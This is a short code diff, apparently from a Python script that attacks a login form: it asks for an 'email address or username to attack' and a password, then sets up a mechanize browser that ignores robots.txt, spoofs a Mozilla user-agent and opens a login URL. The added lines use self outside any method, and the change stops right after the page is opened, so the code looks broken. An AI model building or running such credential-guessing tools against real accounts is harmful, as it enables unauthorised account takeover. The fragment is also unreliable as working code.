@@ -46,4 +46,11 @@ def try_password(self, email, password):
 
 email = input('Email address or username to attack:')
 password = input('Password:')
-try_password(email, password)
+browser = mechanize.Browser()
+browser.set_handle_robots(False)
+cookies = mechanize.CookieJar()
+browser.set_cookiejar(cookies)
+browser.addheaders = [('User-agent', MOZILLA_UAS)]
+browser.set_handle_refresh(False)
+browser.open(self.LOGIN_URL)
+
